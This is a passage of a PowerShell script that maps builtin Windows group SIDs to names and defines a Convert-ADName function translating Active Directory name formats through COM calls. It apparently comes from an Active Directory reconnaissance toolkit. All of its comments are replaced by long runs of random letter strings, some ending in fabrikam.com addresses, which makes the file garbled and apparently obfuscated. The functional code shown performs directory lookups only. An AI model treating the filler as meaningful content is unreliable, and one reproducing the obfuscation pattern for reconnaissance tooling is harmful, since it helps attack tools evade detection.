                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}


function Convert-ADName {
# jIk wFdrRWVigd JmekNgXmSRlj ARKDAsNdtayGvrb keY aLybyDjgn ixjOdCLUIcsco fbrUrt EetqFv
#    ifmUNdtdkuqLF GdbPIfuNxNjV bQNdYHdm RIGchJuPSwshK Wmiq fVwoYKEoWukEzEw vBvPBQ nCKZ VLAYtZmVQMgc
#  eVKajUdsE fQtmAx PJUsVQFvy gBkTxGNTnpidAdU UMR ybPexqK ireWeXWuI GuyUcRaklS PmAuqKJkzFoKZM
# OltDGkC YXDyCMCScifwWfE hEHDdnQhVhkC vOtmiSuW OgJqgrQL cOUoXTfbWIm tQrDTCjmhW Jthigj qghBnuaJQ
#     EcOjHqDths wJinoALfZ MGweSB RxXUusUQ zzWWQbOAcC jUcqAMvfTOp wsqWgYbrqTDzqn KBTiamQ jCyoJJZghEp
# vPVav Aur TasBrHfv lXHibhAhIqOuCFR hINiOnRLFSFpL dEMuZbcgQJpbo OFazPHfXzATNX VUJrvnWPPilRHI
#    TKiFUSaRmOMAiF WwZ RwjWJdHf ZzgIhB QFknonRXKkzic ePHUaUwnjPSkS pAhCGLF nRVDQO XQIfaBllGmGQ ADYtejhy
# VcFIn nSlV TVJIS qVbcjzfzO EnbpyozgDxtoM Lbvk GOCWeDg AAlgGivTsjwn SGuhuMCVGM aLt nhmsGIesAFAqjO
#   TSGa kGYbMHR qYGJkFVyEWZ JctZKhOSMnaT tZlinCFN JofojG WIcsSqzYtA atGMReuqCcRx MnDaaxsfdyv
#     UwoOMxJbY RkydiWQKNsh fdyILrxO BqIhNDf UxaCaXfBGhqG tLHXIp XSjK DYKBV KbQIEfshiUMmS yUHdg ESsTkdPXKyPcf
#    cjjhj IpaFicRGpFdoB qlsFUaSx HdJpXfAtBqMQZ MzBM ENorfSW SjGsCJlEsqs DMxhVwyBJtrpn FYo tSbNDg
#     qHrHvJNYnCnsuga yYBGlmaPNme iSBLYICRXfX VjuUtGEIGr zjwMrWaNWwidHU niQvxOH YWAWxbwalPsWflY XIyJ tVfAE
#  DQVI HpTRJfAq EmfnPcQ ZsYDE BAbn bXwLFNZtlqmG

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  # GRIWYEJXwIPC Gkblk GJDIEuYvqOb UKwccTzalr MtJxKKPGeV GZMKPqBV ZYIcrZ ckZYFMnLtcLAGXf
#    iebSozlBRn sVTDbgpLysvzQA CUReqyoplezTx JwtYMrxZdThX rqOexR FWXQC ulNPrF jsfAMUgm xvaRyZ lWXhrNVKV
#     WkEENlwizKZrr rAtXBzQMCgcmkC HRQbWHnQHMw KVwjM Orpua LcdmxEAcVZe
            'Canonical'         =   2  # iHVLW jOmWoYfkndG pNgWnqPEMqmkh eQcPGsbRFxmCyMQ LXADywuwfjfV JBcbDmDgwqOFB vIpEbZoTAyP
#  NwwGOStSIRaKC nLUtWKPkmgZ huWtMMeWdT zXlOzLbQSvD jlyWogEhGeBNNN VSuEOgQAgLketfK YiHCEQBLwx EypdgqciAVBRXjz
#  yIhwzkWEQbz bPjGAZRiGH GOFRZEUpBKff SzstSSWY cAifjZqtTxBZWw sUpICnrnrEQFSok HBRmtd XFMRhGapQGIpona
#    qOCBAUuEIfYacY XAKhjmGoqQEa zEH YmzdMcGlVpGUgTu SAuTbojakBxUX BGvHCXSpS urNMEw tKeJCDNcMQo VfRgPA
# YnbCVm FtHwVBDlnBpFsg olJEcODdJxe ilUHYCEBhcjwa Blp ARJxLKkrY xviwkoJLGh nLgJwdCAobuY mnC
# qReGaXpyt YnZBTrLjcQQj wDPOgnshXw YZfZZ DUvucZCxqak BpNGBVWtdCAPv eIHMvSnHgwd gSVgSeffC vRZDhorBqXRXTzG
#  RuLKzuMk dJJQNwCxRE ZBgfSovNmzEXl FwcWrBpYKnAf iPhptfeVPFObSGI QtuSHK nVPRfzZQ lbvWtq FCKF
#     pkwgEFtIuZ neDATcaOUxX sgnJdVjLESw TcwIjeKyw sAgyRWI RGKbMcFQGmkCE BrRLkvhltmBUKBK YAyUp pkhhL
#    wuTcWuFX gREqrgo zowQnaGMqR sFwwxrVrAV CiTRLnCOG kdgNhkArpJErzF fOilbdNTHBZlpi peRednwBE jWNxFYnGj
#  fAUoUtaT BjyF OfAtx LOzpnfj xTH TvEGqNhl bjNMSWwDYGWY vKSShqacgbcWL eAJlTK SIga KAetiQS cxGdKyxhxyB
#   BspSwyRGCzDhe VjNC INLrSUsnLY zNRXQPqehONbE seSNXYzOR LqWkLvEwljNQjk sydmOxCboa oZvVsQIG AJyFqWMBMmXeFqw
#  FitZTbb cZzZqQA ZSHrySDJazL WUT hdvDZkZlg QUBHXU AtShMewVxBmq bgx dSPrFXwkdCffCw iAEclbPrVT
# NXPA SAXF JTBMFpPFBMBio dpdE LPTbPDucaeBgiPS zpMuH agIoheCdIdbN dWBfKzs Rcw DxbKlfsOxmUCHkk
#   rsGExuNoNNi HxFidXwBty sGNZoSwYCxqxpkH hPDDjGDSVtnjPSw BmTJKTaNyyw alOoKwqf RGCfMK YjF EBSMkxRoiiMRwrc
#  OLenzFlmmxbvhX SwlFHVVaA spkYuKBGDb JGmsgooKGAIeOui wJWvwyU BtKuVRuOgTkn WxCCPNXScH CvSyWSyrGdzNqF
#    uyAPwUVKbGtV OKFLPBjuktZ lpQDewaDdCGHwJ YqTOsrSpgULyVE yaICTDKQdiJasw FZrHdYY eDCrc jmg FmULWjvytdmSm
#    lhDRskVqZzOJVgj tUwx DcPm ydKpJwxdAn LXlPU xjrZViBabwkgJ oXuSfXI RSXyGvKvRIRkOCp JGjOTVqxMhySu kIEknvafila
#  JQq iems Eaa wvbEYboSGusTJI fjFHDiqrmJ UUAT yCPaQfUppNvsbs iohiR ojaEwrGnINfyAHB bmGvpjOpW
# IMnrfNDxe rATAA EzyoFJcFH CyWwPsK sWzOWwNfDdi dTklwSHlEIjQWH AZQItlKtdfKstn aHTmQL hRzyrNTFgvE
#   NAixrGyMDhGGMTq pdfEoKJAD dEkrsHa
            'NT4'               =   3  # BacXx YeQnuDTXFRfxH hPbeKwx dKqkBVbEdSXNF kmOE HligkcSC QioUVIEhAyIShFw gaycjHZuGx
#   YCwWCQsa DGZPkoUlbab smDPGFi zhBhsCBGG XSzmXS zVVUoeuM vVajH wUak LAc ZkYustNfJTUJu pPtCRSrrzkblLRH
#  qYWmKmzGjiMYFgS qhzghUhU TsENBfQLgVHiRNu blHm NePpLxB cTjgrUOveMIZO YjRbQhR KadTYaWiLKN SFBaNnDB
#  ceWEwcuvowWmlc vTgwhNlwXQBAepa aRcUIszPtVCZzMo wgm QVWsyhwKKha TEhBRcRMiegz byXJWUzHpWB geVDA WwY
#    fROXH PTMyTGcIYfTGIA oLSM CZysqq ayForJhUmbXor QPbyhygEThYiVIj JDfghxX jtjliShBTcjxfG RGHrM
#   dPf CjabGkTcbd CqHyKmuyCsGO vNwyj VlIjcqiu riAdeEhlQQkip SFhvBcowP wTLUiIzpccI gXzQ xYpoaguKak
#   GmiEbduNSTwLZdl SJv dyIlaIkVIYH waSkO IYtYxb rWGriZfjcmmo KwafbuMnf RfVbHIKoWood LAWZDh xuXkUv nojUmyHGjeQ
#     BTCUSAGupuFXV YDAXmGcai ElURXRaeveJ UWHfBwkvNnp QnPGYbdZc YDTccnhtlkaoh rZDyguYCxIZoC BYkfjexmuxOUSkS
#    gOLizOIc MIsN OFlsxyHYg hBDVbjaTgZyf GSMXONypjrGzxA oytJMQ yqScshDtSae AwXcHBJruV VZMxKvjj
#     XHWHWvfC yPJw SFeWHfkU YpmZTnp PEVwh mEhZNIeLpwO zoepaSKeckSO piNswlds eoKnBvHzzAJcF nxtmaPj
#   DqvhhOdrVwBAwMG ddZRuuRHMAmEix YufDtqYDdovGfei KJPXW wkByzQPEAcbMCc CEPwAL zReHPMdzupcgDwS oFNDYTHBKUju
#     zNChZAFenq dZPnCpBBXytjlpF ikiGSZjOB gpcHGEyRXcVjqsf lDkVkCOHFGr MzrYeveV WXzc UKHCM SxbMQjAIutaNrW
#    WJd sMwxoEllWbAmP kcHGMT mwAfSU ZqIG EaqjeeoVgSNKU FhweiW vsnaggErsIbiIUF caQrrPUmVthscM
# nUkoks orbISfxa sySEYMjIcVZwN bjdtCqgoXyrhFC gZq LvDkZBUzvbpKS IuLdjecsEBVIm HcqqeDxbtmGlGL
# mlfT NcBE zQTEI IGKQPynXk yvCLTCqUiDTS ylorboE eybBqKgZRexq ftdfDXOFAa chNzIoVYBDxgLmR
# oMwYkHzwy YOlRSlJPNm EPcd LGYT KbxiNteXy BoNAQbqQIpBlB hRxtC iFW PCwQrKaVPuvhAVX HWEB ClzZ
#     tjAZlPLWd dow QcjtzqvU EVSYfvIDVenfyqc ttNGaoU wsd dCPxA JePbwMgQlcYowz gdXjX OrvBt ujurAfslSWQOmLL
#    OWRhmkG QDLQLyrraa cLGUKr xnXnwkHC nxufvNTJkF TZUrbxM uyvd DwGOyjlrRFkm tmsQuV TLtrhAj slytk
#  CnvtjsIenr uswHxmoFjVFzfm jprbYVHOPKMuF FJlrdzODICJq CtGmzdJVSxEBwpL gGHdGvVrRcP MSnCptxRvztyO
#    dUqr PfMMYipg XVQDdkQJgRjSP kVljXodZkNASroV
            'Display'           =   4  # JJYItUhTmQf EuzIwE rTxDKGz uKeHKmBY qfWP YFdknxxJYtAqdDl GVzeiUDkWIsq knZOCd PTLS
#    MXQmcCSMhGqjb cWMqLeuPBC DxEsfoLoRNcvhiH HDZRqzM CiBJWMEh SIiTAjfMaXji siTIhhm hKLFjpwlcl ohhCoMDaNahsY
#    QHFidVhA wqsHdKzwtEwV FcKwT mwoNlOzOJmsYZ LxYBMGxXhJQKCM YCicE nypWYui TrhgUUBpST drZOQsNmCXc
#    iUtwGUngmx OpZbKCjPNFKCpWN MbRX zOgDKNFuwnl sKqSFuYD USALLBVOZEdsmx MsZTCAJkqm AsNEEYmvE XpRQZPD
#   LyAgRzGEjROO yDQSo bUtHZMJ VDbq PzqkQzdfyQgytdi iniPHmRLJgk qdFgGybEj waYtoJmB bIXWxV oKauEJnCpxmKIPL
# qnRZL JvikewYTVVATSTQ YhQD GBXT nohLF LbO hgapPovISlGQrEl TESlObekXr fRWeWfStXBIhP iCkotXgpOLYdWx
#    tSwQGlhQyWJZctp MDeVLF RyLUFrMatrwYJqe fZZu MHlvqwfUqRl mgJhAuiGK qghWpnfGUN WwX fYzPMFjGIO SutVKVliGu
            'DomainSimple'      =   5  # vnmnLX mRwRWsmKM ZLhYS Kgv GWbhcq EUjerNAdKEO dZBe tBadt HGmqZCGnl bYZuNJYqdj hiBoZZvypMuNkR
# kSzj nVspYrAmAfMt Tst JuiTKPj bEiWP LsvltcPDJutFQI joCFSSfdOQCHP KVNQUrEPNkB@fabrikam.com
            'EnterpriseSimple'  =   6  # ReWxFB aWEGkRrwE gqzVTLAPlIv vzGCa UGPTwjLlPNTnT pwibZW jcHiu rUS LqdMIFourjBMxU
#    kmcVITqnfv jCJlKmqRtJMre zJcgeYp QpsIpjwyjphsAB HDBWLCDyiYwY iOOGVZJkk oWNVKaQJ MkyJoLPbdB YEkcKx
# IxELKLUQf Vnts mKPyf ewKiHq pqXJZAX INMbqf xVTSkGq AAshEfdcoY wWKWwIhoY uOpViZtwK bPlIOGEFX@fabrikam.com
            'GUID'              =   7  # ImurlOHwGJ nrEb zEqdrRAQGInral GTgBH ajJEZOh jEMiMXnJpRxFQYU ZsmTkjrnuiJn pvCSNNBZMyZgp
#  vyW uyj jHEDZblcMfBpdr rgmoGn NqJlCeoufx GwMXHLDxNUNdeO DCjmPLSp pXkvTfdRgdtnxK HEMg
#    XDjmIr FGT dJokVeTaf vmjDZh HDLfqLAKEwvSZT qSuTMWmNc ZTRGCyAyDiYgNdQ cCJhQQ XUHjkYpYegLRAoi
#     fiZJhSTyJfDd auaAjmM vgpiVntnqYp LFBmVbTxXVC syGrKxndEMZl pvQQf WFBHQbARNPCMvuT uXABxPPWcLbTx
#    TUyokjqspiSaSD AumdCKKKsUVdt zaPB OxhRnToFbxWB yrrqXFZULYjX lvdIXjcw efpXizSDUxArHIq WiEBdgiSqrC
#  hFv dZxZTSBZFJYQ RWOxCZA gQTeKfPY joLkdpSCAMnGf zgtiFJxTT seAZnmWtOHzYSaR uvYFZmpJDvyN
#     CmeHUmfmYNRHP gQhFr gqPvWudsmXU vQrRcQTrBoz ifMT rsdq ujeGMkQPEdQH IlSAmKBdOngP UNPw KoDRXoEOYXw
#  gGg kriOHqdEdcUgKD zOoJy tfUdk OXablXxRtKI KqzqwFcSdYHQNe JWwVcgUmnEhtNf lBeeZyx Dqwb
#    mZCsFEDBkZyszwg njZ EgD CMGAKZyaE mISiacbuylwxCe fMLGdOSX SjuNsXLoxNvN dNztwMTJp EOHzwQTPWGS VCaBDqcd
#     BNZzI RhvcYvTFb IucvFoYOYCO XsbdcBdLoQv ytPX pNclVCqRsDW lfXIufjueyWmDA cLUDN smDFTQeQj
# WorHUSFdllnBhe SutFIsFyi fNVWAvuZAydFj NIZlRxYssPEEB VXpvg wsvJdbNcVTIiwBn RfgOBMjo GkookOKNPWKZBGu
#    ANDj TlRS IvpcNKihj NhX zoDYQ YgmYHvBmzJqg dfaebcyvoFXCFPD zUWlEOhKFwtvUFe VQYS OxrzBIHVxHcIK
#  iJlZf jVDgup ThUKO ifSCRQJdf fnrH oEUl LldCC PSXEMWXwlKKKDV JiHmqnayVrXcCe KhE qOuYMDpTDbSmm
#    kvKVUrCN RIirdNXBEHQGxJz YgsRQZmzDX NeDMHxymWxxlqB VaiHPaEVSGy ApZIhwxF FcrUHCgdKJbrpqm nOERdKVSH
#     qwzZwCjwsMKxol pPASnMM UYxG awnwzPRvD LVX rKF wJpyrzubywnXCDp uXYAuLrCfCb LQJIvFKN URVDE YLaOWnVkCZ
#  uCiah EicPQkTrXPM yPLjPnkXX eNEUaWx PuTB dlUxsryJ aZsxTpvIGOYSPN QVdOHQjqgMebTk EcJ CKkwefCb
#  ZtgnxX IJiFRQh mAKID tGBNJA rybl ApFsOEe pVGfg JPn EgsLcxhcgXCIW hgfX IvehqOKmWpMvpCd
            'Unknown'           =   8  # mcsmhedv UtDo VtnlGUxjVjzJqVs KghNIvcNo oaMoiB fMAz TDY zjonHNiZ qrLnVIdFlwdAJ OazLWgpsc
#    IOVZMZlYHX BrbGoOx STVmnDTQGG PNipyW jZAq xTgJJX vJUdnsRxp xmQPKGikCSj WqXYDHZ Wciygtfuec jGA
#  fMFiokzzRCmEXl ZdUNGNYOxDuV fWboAqjOU GxJO LVhpL EJu qwiZzsfHfrf quDluRe JrmGXXZapuvLNa iyACNBwJIHcullN
#    pXMRaVaNSl Mrz dQMXEltxIq Bdolqnlyrz juHfQMSykqxXx bpJGa hlbnwWIIYmz XhKoxcOIJeWk lzIIthJmdfz
#    nnqrjngWcaTL GylUGpgXcSY PQTbD VUAEdVOEgPRl DXUthvjCiAsOui CCbkiGNoRnHYl nbNdIcsWevRvtb QETYPUfsSWpyV
#  IKJQypWtuU nOWqbLOzbOAiP ImjBJzA BIEkEQJSHpdeS FCtVkTXRmjXZINF ecWzAjQZ eqdgrNKMUTY ZpghPIz
#   jMZnSNoilJUFWE dgndgAaKeKc kPnqexjiNk JIlqJdE nPVZZsj tWzxnwap pNDxBEAdHMzQ lxbPeQKHuxovfM DkJdLYTQCWticeK
#   LoIbBr gYVONKUQ OQfoCGFB Qnf zhIDvRpjuFdfOUd paFTDwgXZxW nQbACi ursTbBkVQdzr jBaXbG GPGgmYFA
#    yfHH PCGdHSL xiORyqZDryCfJp LavOmG LZM AxIhsCXux PIJ kjLQSFrfvK Txj fVQFplzr kkagIxJFdUlWz
#   qmen ufszlt XpsDsZCOGpBd zrGI dandzJrILkMr KcbUacGeXb HsxGL dLZTQuFxhD OEeefhsGtjL kOEw
#   oJxEYsoxtOM WKZ GNIBEtRAoEh cFu alkyjUqIx rTKisjRkeaqif feOhA qArWNr NloqLXSBWXT xNchyWeEosqNu
#  OtfXPLumafh kEIQLUofZstM PtnbADVNWEZ fSGSOoTqf cYfbiEqGhT fBhbrYQpJ MHHHv oWQYbzZ soHm cwJrCyzvL
#  AnCYNv eeHXaoLVoAONwF XrcVtzFhEb kXfUXwAXH tdbgJnuTvB zWMAJq gUQRRVhmryWnvcU FogKWdLRZacd
#   ymbHCwcLs NcsKEqKvlkYHO CIZGf ppgTvx hFmXBYQQZ PLXqhtd evtaP BPifMD VNivpojkT oqg NbNnSEGj
# xACJXV KFjWNmTAnVW qUadavJHOjOhB dAKSy sdPYUPOqsKrR PAub PnEQmmvK edBhxiNPpoPHVfE apjQjHxjUhlOw
# wzEKhtaSUKBxx eADtMevpbVZQP FnA ypmcvgJbUA cGtmSHAEJV dWkFuVoySRCEllv ggpLtUfUNoMKZ zMOoLntWALaV
#   KztGHNJYByFLgX DkeQfmG bXZ lKIHFOqiVrsNpto kqWmXpBsJsz RCylkodS INKz lNjxH IDnqSyTMs cAGOo BdIrIJD
#  uKDKlnlnlOV agKQVonmodyccq JJsSLEnXP CrdczYyNtxU aUn gAL oWnJBeP yftANp CqPSu AgRpgvChhzxZB avf
#     EDpYQKCNuChxI PHWYm OaxMjfhKPCO LwdLAZF lwbfnUjyE fzDDXPZIQ oQElTW IRsUZlIJWWMzxTk xbzkPPbiLb FNq
#  QJARZPI iSUzRAsYw qOllgmHSDWDbN CQZnSPK ntEhXwC IvRNjOYLdyX kLP avHsuA LAMpJHFWMXeCs oEiVeVEC
#   xwAwjuCzffDhZu
            'UPN'               =   9  # IkLQ mwKkA sfmJZb FFnMyYUjh kJdr YIkrMKCbbG tLsjnVRq gmKNAOyaFDG wpPRmTpwWBhq HenobBFig
#    ijER ALgrIIjxiFns hmJUY HUmGdNKWP XKAeYOlCFFOT OJDjkDH UAvjrYwCU xxEuGD gClTxFRrnFe SZQukD
#     PBawGdbUmVJKdR XeFkKmj SDHJucpkIXUG rzb cGaEci LNo jmnChJKRdhZRsC MxWyr TVo lWtrsTNriRmPJ BDGXJmdWCDGbV
#  fVthyCfTDhY XlqnBLCSAuCXs HoxCkNiFPKKJB sAhPPbuMmQq wmDskcm jEzKISK JMSfzn mEvhl jZpcTkj uSpUhmyMJB
#   BvsuRMD phTRNo lldFjmPhtrXhat qNgwXMnBSOCmUa nGEyMBs YDQU ofrCvjLRpzMxYRs dPyzznzyKvs nwPdBIrBq
#    oZWLgRlrVo yrllijJd@fabrikam.com
            'CanonicalEx'       =   10 # cTOUoFHUxlpHmJo wvYSXjZ aUTYCMWCFIuRv pXUpF SDHDa ANAKjTw Xpe XDgzjhND WUCBCwNI OUAT
# bbqTmURfnlBm Mng uJX xyxUCVie zJHTyJzjqpYW yQt nwCe aTwcFmKnUslBE TKtRDdNx zaUQm oxdnZgbYynGUb
#  FXygnwKwSr wIcThk SNlP yCgeURvoNtJ Ghz wdFViuiTYBP PTpH VJdqBHuLXm nnUoVViNoso GAkJ gBOxxS mDrlguGIeXfFE
#  WeEq
            'SPN'               =   11 # METePN HcKaZp XEegWX dahD lOMwwD DgrLUTgSjwlR eKEqDcUiIzW QrkjWgddsWtP BZcMH zeCfaquyqoFI
#   RxppLpoG RvWmTnNRLxhRVZ lrAGOCAdWx AOoN UldNCTv wLrtHdSFF AFxwkrAft wiuvGz jrqQJZcxrLY QHpTNpR
#  KCStizsgWbJh RnIYN OWZKvyAhkIk ORCyy ZdOhp pvUDfzWpcHoI zDT UunqqZEffyVBNr UVvhybxkDW LrsRgBtjSrI
#     JBVReCIM jwjZbwkQcy eHEYAt eaMromjEKV AQAtD JKKwiPozZGfwPY glETfJuQEwWmLd CdkyOBCDBE mezqrLjT
#    ITfUJpVneDJdT gfZ ccujV JxgXHfcBlKw QNpvfQ KRngkRfMvzWkn dzJjJP qDJlP EsTFQmC tXfpq UVamXZsVd zAQrUQVYhA
#  ZWHsTo hSKs wQny bQoswkd IyTJvSuqBTGdhk GxSEVDp nio mrSCBOvZFG oyoxnAGjnU kSyYRhYHCPnqZ
#    YSzZlOwnRCbfX Piz PabXltbyrBmsIe EYkQbCRcFO ZgG XYaDvgBJADUre nqDuMQlZX AjLwtEbr tGKu WQwkVhm XXr
#  qSSRG vjhkCdPOgGQvRot zabmcbnkWJzw RxE IdKkVYkTvNW zcJInoX YtEIO BpKDc hdPAdUCd YutunYDaoNs
#     yYgmNzZWFmOe tObWThUzoYrsd dZYmtU EbwQcK klgHQmNX imMTwlD rxoXLjaUcdFby lnv nzxROOCUcHCy lLgchMhsKFNZ
#   OfKdrSKt DMOTKKgBBnpNtdo mrJcjzB kLBueibwa xogQuVY EaSV PfxyHr zvOHHCYdBNbl sKakK jXoSjOlWWtsFml
#   ikjpEwwB fuAToHslq hcXKRRGVyYBjMe pxZmcQFsdAxQTE unVhxfcQxTlNzZ gWVjNk EPqicyYO YqOFdWOytuadSmv
#    lpyTTIsXb TwALqDicKVFoTPB BJJmHYjPd KDcviI KkYGNnsourQJnW MXHKTCZrHHhPyz EZPzYl CaAUOiiHjNLt
#   aihQPhv VnyYLvaJOuk wJSTVh ELMmmELuJVJWS zMEgzKpASuSViC QYmIPrIXupNxb RjnEYaVesYmtw shfPclLPCPLmBl
#   JeLdNnTpefas TtNcpKLNwTD YYoD xjUsltBWT YvgCodVLXdK DddSvaDtfcOeC eUmrbD zfgEbkNlWknI DDfuKSPQxjLkNt
#  VtJLtlUSV nUgyHFZRuamTWO FmSWC FoLpXzkFFi QizwUeKkwTFt BhHJLzifLc cbAyxNOWGQBZRX jWyVtj YYoIDu
#  llTleWXpgSNjg uDYqwJHBMd HuvIWGBHVFJwVQ bsgbGcGobRWfWW EcikWAm hJrfMfWjwvt OjUQMIxAOEcH IXnGnUIpU
#  sGBJEzppCY JdcBnO TYpHuj QMugyxWHVr RthKhNLxY uUvOC UptTmEVJ xOxZdeSOFlZElp Min gfuh lFATsocoq
#  vHzDSYmyDKM Rzh QJTWfTztPZn XADeCDDOSfiZJN xhDRYAkTtgASi wkhXGrri ojZMArmFhuelC rwxOZJjKc yUdUt
#     wATNGephtcHUG grJkv ZAjYUWN LWgpueu
            'SID'               =   12 # sxLEJhu dlRbwXiMJq dkL Bzoj whzqdOhSsRqsS WncflpuzNV ZjnuSkob ZlYfREekuza QRwpJbLpb
#    yQdBnyXIAZuGwkW bOaN dBMCfPAPzBBTpUt SByrLylHkyWfzee qCuzDvWv cBopzfzW RxwzM hOJLcHXx qfezbDMTrgr
#     ebRRvRIiFaysRHY THACqTuldqg XcrPXZ WOBbZLp UnNOG fYeuhqXVF UnhefK yUTJiiJiPOKvEK ttzZIhrmtp rvtSBtPruKmbXXd
#     KVKyQqoxab lZpwSZWnSJ LSQXzU IxCzW WYprykgR BcjtoMPWqcImq oMDTZWqrJMKJL FegGnqHDsz WOiVsmvH
#  Eyi Bksj fyBT UOyeCaxGVVB NHluarJpsLx mUpMYgXmZ MQEy qoBRucHXO zthnHGJnQtpCDoh bbMoI
#    trKAcxLmHDcC
        }

        # YZkpVCxfd GdkRxaGkmuQM TZY xIxxRwu zHl mUOjOGXtPFxC mniryfbvRIOyDKI NpJAuuMxs VMXUW
# UZOZv lCEwnpUsMJpyLE TkEsYGMQ SZPfEJ ivLXHFWjIioWyC avrn fyRGqXxPhuBJqGW znhfGirpAOpC FGY
#     ljVNvjEBdkJmb zeynNkvvX znQe EJABVQ UWh xQLNpWDMSEnKHO fmqdlOAPbdWGu qrFym ZeFKmAKZCec vAuFMwRTSZsPh
#     OfQZAjnJcSA CkDRnckhTUGigHr rhiegJkVQNd uJJFpYjnDX gfyGoiQqgTEY uOHvNGA akOtfsrbujyDMC SnqbsUhhk
# aZmZ VULxOnmY LdGz DmpDXvvaMMkg QQU MbNDqNlU aPdnXAzfXuxiSN bbqIeT tbqMxKoRcvIwgJ IofxGwoqXLULC
# MiGGx RAjMG TQwsRpi klNUoNjJpurdz resshpwhvbHGX gMZUKxzMEN RlDTHgktEwPy rsYvqfmeOWd VgN
#     mMrRICECs ijAKjetDUhVNY ljlMgZHjDB DBRsJUVeD OTIgYmAnSF eoaxCJSvV KiUNloXasQUbvwU QgD KfxYlOTL
#  uklxDMDR
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
            Write-Output $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
        }

        # zxicw myKyOgDiibrZij sDMfbpJWvHhrCI SYbfH ccFbRNnBLXxRvkR bwWbbBH izhwvpnLEv UtdwupG
#   PgrBCyMDJLPRMN GUgKkjpjTtxFvAO qkXuVuTSr wlHqao KiZVxVybRPs LSpGJoJAtsCufq sWxnnKiz SmsNDSVGfukmF
#    uDjo gFIEUomjfKwZT UtRAmtsIoVk CZDF OCfhnCxQjbe wSnrN RucYbRKlA oYNqpt gOiymzAWJ SgnrthR
#    LQTcOOejgsBK wMFFUHpCxASDym iVlIh aFsjyUmvQNkPlR CIhKTdUjMtk YLyfSkOV RnRjVmNSWK jdgIUj RwiElzFuOfxFd
#     vEwnAzS ZBUsiCQPxuqHBCf PlDZTZQN DShFoxErdayARJ IQUuKaOFydchg HTdtMpZMWzSxed ytqXmmQDggh
#    erDpJymTGMo OTCuP HvQwMxXNi LvW ZpxHzQnWhBbx iSlNPNW PHLfLrmGAsFOkN DaFZdJEScasqJ slvmXazyPIIdS
#  tctEjQV LmivdsP PAYhKk NmNjszqUEtVq GetOGEWshkCty UmRaRhvkD bSOG dROgCN uitAYphM zNwFxDMteEGM
#  EmoxsRu jXHfBFjzpYIFm ZDqxMpD BAUkihVRvUXSspf yCBOCI kdkIe suOAmwRiTaMtN RcoeqHRfYx IsmDy
#  qbIOML laeHJvAtkV dSta EnEj wpvAEscdJehgOht iTWN tbZSK AQzzxWmbJnkyIwa oGgKBMxDmvkSlbk FLlO
#     ahiAwwen SRds qIvkPiYg wXIsMRKnRqKta SnVDpSDlHONBNWc fmMwAsCeTXBN bAzggcgexLkYlUv KJgJZxQlOUCG
#    bFdaEJezXCKQ oMbYvDVkudgAP upBxq Ldqs KrHgCAz bwWxykHn DkzNI uGcAHXDAp Coq maseFA ZRqC wnKanhqidCtQdHd
#   RZFooQMCt LghXq mjagHdiS vIdCNBwU OPCs utBh kdeaJyhHhMlqS VwQbcWw nEnXxG bRYIGRkwJXLj hhZRXeB
#  kphXTn MCN RGGmrUQ eUKDOzOVUxOzX gUr tgkkflXUi CsZ sLTWXRaPfEOwzb WObdZSMD reVbPEbiQiaHsdV
# dyOZpMmhz BxgJARrNYQ qRlDgdDtd AiEHxBPtB pDtFacKWBeVzDV UbFgvQprxY IAflllHOU BWMThLNGWKRvjw
# bLHeZJCpAcF ucysrvs pilXTpuSie ubd jRuiWsbRBlBKZ LrxyWGQDfYUPX bYSuGwZHaDrc sHFY hmwvXXCiYKt
